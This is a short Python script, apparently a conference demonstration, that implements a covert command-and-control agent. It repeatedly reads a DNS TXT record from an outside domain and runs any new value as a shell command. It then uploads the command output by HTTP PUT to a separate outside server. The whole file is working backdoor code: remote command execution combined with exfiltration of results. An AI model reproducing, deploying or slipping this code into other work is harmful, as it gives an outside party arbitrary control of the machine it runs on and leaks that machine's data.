import dns.resolver
import subprocess
import time
import requests
import os
cachedresults = None

def dnsrequest():
    global results
    results = dns.resolver.query("grrcon.thomassomerville.com","TXT").response.answer[0][-1].strings[0].decode("utf-8")

def execcmd():
    FNULL = open(os.devnull, 'w')
    cmd = subprocess.run(results, shell=True, stdout=subprocess.PIPE,  stdin=FNULL, stderr=FNULL, encoding='utf-8')
    print(cmd.stdout)
    requests.put("http://devserver.thomassomerville.com:8000/sassypants.log", data=str(cmd.stdout))

while True:
    dnsrequest()
    if cachedresults != results:
        execcmd()
        cachedresults = results
    time.sleep(30)
